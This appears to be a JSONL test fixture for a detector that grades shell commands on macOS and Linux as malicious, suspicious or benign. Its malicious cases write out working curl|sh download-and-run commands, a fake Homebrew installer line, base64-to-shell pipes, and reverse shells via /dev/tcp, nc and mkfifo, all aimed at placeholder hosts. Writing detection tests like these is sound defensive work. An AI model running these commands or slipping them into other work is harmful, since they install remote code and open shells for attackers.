{"id": "command.1b.unix.osascript-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["osas", "cript -e 'display dialog \"Update required\"'"]}, "expect": {"level": "suspicious", "reasons_contain": ["osascript"]}, "tags": ["macos"]}
{"id": "command.1b.unix.osascript-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["osas", "cript -e 'do shell script \"cu", "rl -fsSL ht", "tps://example.invalid/a | sh\"'"]}, "expect": {"level": "malicious"}, "tags": ["macos", "clickfix"]}
{"id": "command.1b.unix.osascript-003", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["cu", "rl -fsSL ht", "tps://example.invalid/a.scpt | osas", "cript"]}, "expect": {"level": "malicious", "reasons_contain": ["下載後直接執行"]}, "tags": ["macos"]}
{"id": "command.1b.unix.osascript-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["osas", "cript ~/scripts/backup.scpt"]}, "expect": {"level": "none"}, "tags": ["macos"]}
{"id": "command.1b.unix.quarantine-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["xa", "ttr -d com.apple.quarantine /Applications/Foo.app"]}, "expect": {"level": "suspicious", "reasons_contain": ["隔離標記"]}, "tags": ["macos"]}
{"id": "command.1b.unix.quarantine-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["xa", "ttr -cr ~/Downloads/Foo.app"]}, "expect": {"level": "suspicious"}, "tags": ["macos"]}
{"id": "command.1b.unix.quarantine-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["xa", "ttr -l ~/Downloads/Foo.app"]}, "expect": {"level": "none"}, "tags": ["macos"]}
{"id": "command.1b.unix.quarantine-negative-002", "area": "command", "op": "command.analyze", "source": "new", "input": "sudo spctl --master-disable", "expect": {"level": "none"}, "tags": ["macos"], "note": "Gatekeeper switch on its own is a sysadmin command (benign.cmd.234)"}
{"id": "command.1b.unix.download-run-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["cu", "rl -o /tmp/u ht", "tps://example.invalid/u && xa", "ttr -c /tmp/u && chmod +x /tmp/u && /tmp/u"]}, "expect": {"level": "malicious", "reasons_contain": ["下載後直接執行", "隔離標記"]}, "tags": ["macos", "clickfix"]}
{"id": "command.1b.unix.download-run-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["cd ~/Downloads && cu", "rl -LO ht", "tps://example.invalid/setup && chmod +x setup && ./setup"]}, "expect": {"level": "malicious"}, "tags": ["macos", "linux"]}
{"id": "command.1b.unix.download-run-003", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["wg", "et ht", "tps://example.invalid/i.sh; sh i.sh"]}, "expect": {"level": "malicious"}, "tags": ["linux"]}
{"id": "command.1b.unix.download-run-004", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["cu", "rl -fsSL ht", "tps://get.docker.com -o get-docker.sh\nsudo sh get-docker.sh"]}, "expect": {"level": "suspicious"}, "tags": ["linux", "installer"], "note": "get.docker.com is on the official host list"}
{"id": "command.1b.unix.download-run-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["cu", "rl -LO ht", "tps://example.invalid/app.tar.gz && tar xzf app.tar.gz"]}, "expect": {"level": "none"}, "tags": ["linux"]}
{"id": "command.1b.unix.download-run-negative-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["cu", "rl -o data.json ht", "tps://example.invalid/api && cat data.json"]}, "expect": {"level": "none"}, "tags": ["linux"]}
{"id": "command.1b.unix.substitution-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["/bin/ba", "sh -c \"$(cu", "rl -fsSL ht", "tps://example.invalid/install.sh)\""]}, "expect": {"level": "malicious", "reasons_contain": ["下載後直接執行"]}, "tags": ["macos", "clickfix"], "note": "fake Homebrew installer (AMOS)"}
{"id": "command.1b.unix.substitution-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["ba", "sh <(cu", "rl -s ht", "tps://example.invalid/i.sh)"]}, "expect": {"level": "malicious"}, "tags": ["linux"]}
{"id": "command.1b.unix.substitution-003", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["source <(cu", "rl -s ht", "tps://example.invalid/env.sh)"]}, "expect": {"level": "malicious"}, "tags": ["linux"]}
{"id": "command.1b.unix.substitution-004", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["eval \"$(wg", "et -qO- ht", "tps://example.invalid/a)\""]}, "expect": {"level": "malicious"}, "tags": ["linux"]}
{"id": "command.1b.unix.substitution-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": "echo \"$(date +%F)\"", "expect": {"level": "none"}, "tags": ["linux"]}
{"id": "command.1b.unix.pipe-sudo-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["cu", "rl -fsSL ht", "tps://example.invalid/setup | sudo -E ba", "sh -"]}, "expect": {"level": "malicious"}, "tags": ["linux"]}
{"id": "command.1b.unix.pipe-python-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["cu", "rl -s ht", "tps://example.invalid/a.py | pyt", "hon3"]}, "expect": {"level": "malicious"}, "tags": ["linux"]}
{"id": "command.1b.unix.pipe-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["cu", "rl -s ht", "tps://example.invalid/api | pyt", "hon3 -m json.tool"]}, "expect": {"level": "none"}, "tags": ["linux"]}
{"id": "command.1b.unix.pipe-negative-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["cu", "rl -fsSL ht", "tps://example.invalid/key.gpg | sudo gpg --dearmor -o /usr/share/keyrings/x.gpg"]}, "expect": {"level": "none"}, "tags": ["linux"]}
{"id": "command.1b.unix.decode-shell-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["echo Y3VybCBodHRwczovL2V4YW1wbGUuaW52YWxpZC9hIHwgYmFzaA== | bas", "e64 -D | ba", "sh"]}, "expect": {"level": "malicious", "reasons_contain": ["Base64"]}, "tags": ["macos", "clickfix"]}
{"id": "command.1b.unix.decode-shell-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["ba", "sh -c \"$(echo Y3VybCBodHRwczovL2V4YW1wbGUuaW52YWxpZC9hIHwgc2g= | bas", "e64 --decode)\""]}, "expect": {"level": "malicious"}, "tags": ["linux"]}
{"id": "command.1b.unix.decode-shell-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["echo aGVsbG8gd29ybGQ= | bas", "e64 -d > hello.txt"]}, "expect": {"level": "none"}, "tags": ["linux"]}
{"id": "command.1b.unix.reverse-shell-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["ba", "sh -i >& /dev", "/tcp/192.0.2.10/4444 0>&1"]}, "expect": {"level": "malicious", "reasons_contain": ["反向 shell"]}, "tags": ["linux"]}
{"id": "command.1b.unix.reverse-shell-002", "area": "command", "op": "command.analyze", "source": "new", "input": "nc -e /bin/sh 192.0.2.10 4444", "expect": {"level": "malicious"}, "tags": ["linux"]}
{"id": "command.1b.unix.reverse-shell-003", "area": "command", "op": "command.analyze", "source": "new", "input": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 4444 > /tmp/f", "expect": {"level": "malicious"}, "tags": ["linux"]}
{"id": "command.1b.unix.dev-tcp-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["timeout 1 ba", "sh -c 'echo > /dev", "/tcp/192.0.2.10/22' && echo open"]}, "expect": {"level": "suspicious"}, "tags": ["linux"], "note": "port check: a network shell without an interactive shell is only a warning"}
{"id": "command.1b.unix.background-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["no", "hup ba", "sh -c \"$(cu", "rl -fsSL ht", "tps://example.invalid/a)\" >/dev/null 2>&1 &"]}, "expect": {"level": "malicious", "reasons_contain": ["背景"]}, "tags": ["linux"]}
{"id": "command.1b.unix.background-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["osas", "cript -e 'display dialog \"x\"' >/dev/null 2>&1 &"]}, "expect": {"level": "malicious", "reasons_contain": ["背景"]}, "tags": ["macos"]}
{"id": "command.1b.unix.background-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["no", "hup pyt", "hon app.py > app.log 2>&1 &"]}, "expect": {"level": "none"}, "tags": ["linux"]}
{"id": "command.1b.unix.one-liner-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["pyt", "hon3 -c \"import urllib.request as u;exec(u.url", "open('ht", "tps://example.invalid/a').read())\""]}, "expect": {"level": "malicious", "reasons_contain": ["下載後直接執行"]}, "tags": ["linux", "macos"]}
{"id": "command.1b.unix.one-liner-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["pe", "rl -e 'use LWP::Simple; eval get(\"ht", "tps://example.invalid/a\")'"]}, "expect": {"level": "malicious"}, "tags": ["linux"]}
{"id": "command.1b.unix.one-liner-003", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["pyt", "hon -c \"import os;os.system('cu", "rl -s ht", "tps://example.invalid/a | sh')\""]}, "expect": {"level": "malicious"}, "tags": ["linux"]}
{"id": "command.1b.unix.one-liner-negative-001", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["pyt", "hon3 -c 'import sys; print(sys.version)'"]}, "expect": {"level": "none"}, "tags": ["linux"]}
{"id": "command.1b.unix.one-liner-negative-002", "area": "command", "op": "command.analyze", "source": "new", "input": {"parts": ["pyt", "hon3 -c \"import urllib.request as u;print(u.url", "open('ht", "tps://example.invalid').status)\""]}, "expect": {"level": "none"}, "tags": ["linux"], "note": "fetches but does not run what it fetched"}
